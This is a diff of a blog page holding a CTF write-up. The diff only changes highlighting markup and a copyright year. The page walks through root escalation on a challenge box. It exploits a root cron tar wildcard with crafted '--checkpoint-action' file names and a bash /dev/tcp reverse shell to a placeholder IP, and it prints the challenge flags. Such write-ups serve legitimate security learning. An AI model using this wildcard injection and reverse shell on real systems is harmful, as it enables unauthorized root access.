+</span></span><span style="display:flex;"><span>dr-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root         <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 ..
+</span></span><span style="display:flex;"><span>-r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery  <span style="color:#ae81ff">220</span> Dec <span style="color:#ae81ff">20</span> 18:27 .bash_logout
+</span></span><span style="display:flex;"><span>-r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">3526</span> Dec <span style="color:#ae81ff">20</span> 18:27 .bashrc
+</span></span><span style="display:flex;"><span>-r-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery  <span style="color:#ae81ff">675</span> Dec <span style="color:#ae81ff">20</span> 18:27 .profile
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 .ssh
+</span></span><span style="display:flex;"><span>-r--r--r-- <span style="color:#ae81ff">1</span> root root           <span style="color:#ae81ff">29</span> Dec <span style="color:#ae81ff">20</span> 18:24 flag.txt
+</span></span><span style="display:flex;"><span>dark_lottery@9db68003fdde:~$ cat flag.txt
+</span></span><span style="display:flex;"><span>IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Only one step is remaining !</p>
 <h1 id="5th-step---lets-escalate-">5th step - Let&rsquo;s escalate !</h1>
 <p><img src="/img/santhacklaus/arch19.png" alt=""></p>
 <p>The description is explicit : &lsquo;finish the work&rsquo; mean &lsquo;obtain root access&rsquo;. Privilege escalation is a huge classic in ctf. And sometimes it can be very difficult. So the first thing to do is to take a cheatsheet to help you.</p>
@@ -813,19 +811,19 @@ IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color
     </p>
 </div>
 <p>The first thing I do when I have to do a privilege escalation is to gather as much informations as i can about the server. This is the <code>Operating System</code> section in the cheatsheet. It&rsquo;s really usefull when the server is old and a public exploit is available.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">dark_lottery@9db68003fdde:~\$ uname -a
-Linux 9db68003fdde 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
-
-dark_lottery@9db68003fdde:~\$ cat /etc/\*-release
-PRETTY_NAME=&#34;Debian GNU/Linux 9 (stretch)&#34;
-NAME=&#34;Debian GNU/Linux&#34;
-VERSION_ID=&#34;9&#34;
-VERSION=&#34;9 (stretch)&#34;
-ID=debian
-HOME_URL=&#34;https://www.debian.org/&#34;
-SUPPORT_URL=&#34;https://www.debian.org/support&#34;
-BUG_REPORT_URL=&#34;https://bugs.debian.org/&#34;
-</code></pre></div><p>So what do we know about this server :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>dark_lottery@9db68003fdde:~\$ uname -a
+</span></span><span style="display:flex;"><span>Linux 9db68003fdde 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dark_lottery@9db68003fdde:~\$ cat /etc/\*-release
+</span></span><span style="display:flex;"><span>PRETTY_NAME=&#34;Debian GNU/Linux 9 (stretch)&#34;
+</span></span><span style="display:flex;"><span>NAME=&#34;Debian GNU/Linux&#34;
+</span></span><span style="display:flex;"><span>VERSION_ID=&#34;9&#34;
+</span></span><span style="display:flex;"><span>VERSION=&#34;9 (stretch)&#34;
+</span></span><span style="display:flex;"><span>ID=debian
+</span></span><span style="display:flex;"><span>HOME_URL=&#34;https://www.debian.org/&#34;
+</span></span><span style="display:flex;"><span>SUPPORT_URL=&#34;https://www.debian.org/support&#34;
+</span></span><span style="display:flex;"><span>BUG_REPORT_URL=&#34;https://bugs.debian.org/&#34;
+</span></span></code></pre></div><p>So what do we know about this server :</p>
 <ul>
 <li>The Linux distro is <code>Debian 9 Strech</code></li>
 <li>The kernel version is <code>#1 SMP Debian 4.9.130-2 (2018-10-27)</code></li>
@@ -950,11 +948,11 @@ Configuration file is /var/lib/exim4/config.autogenerated
 </ul>
 <p>As you see, there is serveral public exploits and the vulnerability is referenced as <code>CVE-2018-6789</code>. The attacker can obtain remote execution code on exim 4.89. I stopped my research here because this is not the resolution method wanted by the creators of the ctf. But now, you know an other privesc technique :D</p>
 <p>So now we have finished our investigation. Time to exploit ! Go back to our crontab <code>backup-cron</code>. If you remember well, the crontab lauch every minute the script <code>/backup.sh</code>. Look at it :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
-</span><span style="color:#75715e"></span>/bin/rm -rf /backups/*
-cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backups/bck-src_<span style="color:#e6db74">`</span>/bin/date +<span style="color:#e6db74">&#34;%Y-%m-%d_%H%M&#34;</span><span style="color:#e6db74">`</span>.tar.gz *
-/bin/chmod <span style="color:#ae81ff">440</span> -R /backups
-</code></pre></div><p>Hoo what an ugly backup script ! What is it doing ?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>/bin/rm -rf /backups/*
+</span></span><span style="display:flex;"><span>cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backups/bck-src_<span style="color:#e6db74">`</span>/bin/date +<span style="color:#e6db74">&#34;%Y-%m-%d_%H%M&#34;</span><span style="color:#e6db74">`</span>.tar.gz *
+</span></span><span style="display:flex;"><span>/bin/chmod <span style="color:#ae81ff">440</span> -R /backups
+</span></span></code></pre></div><p>Hoo what an ugly backup script ! What is it doing ?</p>
 <ol>
 <li>Clear all backups in <code>/backups</code> directory</li>
 <li>Go to <code>/opt/src</code> and do a backup of all files in the directory to <code>/backups/bck-src&lt;formated_date&gt;</code></li>
@@ -964,24 +962,24 @@ cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backu
 <p>You really don&rsquo;t see ? Return to our cheatsheet : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution</a></p>
 <p><em><code>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.</code></em></p>
 <p>We will exploit <code>*</code> tar wildcard. Juste watch and learn ! The <code>'--checkpoint-action'</code> option, that will specify program which will be executed when checkpoint is reached.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Go to the directory where everything is tar</span>
-cd /opt/src
-
-<span style="color:#75715e"># Create the 2 necessary widcard</span>
-<span style="color:#75715e"># man tar</span>
-<span style="color:#75715e"># =======</span>
-<span style="color:#75715e">#      --checkpoint[=NUMBER]</span>
-<span style="color:#75715e">#              display progress messages every NUMBERth record (default 10)</span>
-<span style="color:#75715e">#       --checkpoint-action=ACTION</span>
-<span style="color:#75715e">#              execute ACTION on each checkpoint</span>
-touch -- <span style="color:#e6db74">&#39;--checkpoint-action=exec=bash shell.sh&#39;</span> <span style="color:#e6db74">&#39;--checkpoint=1&#39;</span>
-
-<span style="color:#75715e"># Simple reverse shell</span>
-echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/12.34.56.78/4444 0&gt;&amp;1&#34;</span> &gt; shell.sh
-
-<span style="color:#75715e"># Set execution</span>
-chmod +x shell.sh
-</code></pre></div><p>And set your listener on your attacker&rsquo;s server</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Go to the directory where everything is tar</span>
+</span></span><span style="display:flex;"><span>cd /opt/src
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create the 2 necessary widcard</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># man tar</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =======</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#      --checkpoint[=NUMBER]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#              display progress messages every NUMBERth record (default 10)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       --checkpoint-action=ACTION</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#              execute ACTION on each checkpoint</span>
+</span></span><span style="display:flex;"><span>touch -- <span style="color:#e6db74">&#39;--checkpoint-action=exec=bash shell.sh&#39;</span> <span style="color:#e6db74">&#39;--checkpoint=1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Simple reverse shell</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/12.34.56.78/4444 0&gt;&amp;1&#34;</span> &gt; shell.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set execution</span>
+</span></span><span style="display:flex;"><span>chmod +x shell.sh
+</span></span></code></pre></div><p>And set your listener on your attacker&rsquo;s server</p>
 <pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 34982
@@ -992,19 +990,19 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre><p><img src="https://media.giphy.com/media/NEvPzZ8bd1V4Y/giphy.gif" alt=""></p>
 <p>AND VOILA ! You can validate the challenge !</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">root@9db68003fdde:/opt/src# ls -al
-ls -al
-total 20
--rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint-action=exec=bash shell.sh
--rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint=1
-drwxrwxrwx 1 root root 4096 Dec 29 23:17 .
-drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
--r--r----- 1 root root 26 Dec 20 18:24 .flag.txt
--rwxr-xr-x 1 dark_lottery dark_lottery 44 Dec 29 23:17 shell.sh
-root@9db68003fdde:/opt/src# cat .flag.txt
-cat .flag.txt
-IMTLD{R04d_T0_Th3_sW1tCH}
-</code></pre></div><h1 id="conclusion">Conclusion</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>root@9db68003fdde:/opt/src# ls -al
+</span></span><span style="display:flex;"><span>ls -al
+</span></span><span style="display:flex;"><span>total 20
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint-action=exec=bash shell.sh
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 dark_lottery dark_lottery 0 Dec 29 23:17 --checkpoint=1
+</span></span><span style="display:flex;"><span>drwxrwxrwx 1 root root 4096 Dec 29 23:17 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
+</span></span><span style="display:flex;"><span>-r--r----- 1 root root 26 Dec 20 18:24 .flag.txt
+</span></span><span style="display:flex;"><span>-rwxr-xr-x 1 dark_lottery dark_lottery 44 Dec 29 23:17 shell.sh
+</span></span><span style="display:flex;"><span>root@9db68003fdde:/opt/src# cat .flag.txt
+</span></span><span style="display:flex;"><span>cat .flag.txt
+</span></span><span style="display:flex;"><span>IMTLD{R04d_T0_Th3_sW1tCH}
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
 <p>Wow already 1000 lines !
 So what do we learned with this challenge ?</p>
 <ul>
@@ -1040,7 +1038,7 @@ So what do we learned with this challenge ?</p>
 		</ul>
 	</div>
 
-	<p>&copy; 2022. All rights reserved.</p>
+	<p>&copy; 2024. All rights reserved.</p>
 </div>
     </div>
   </div>
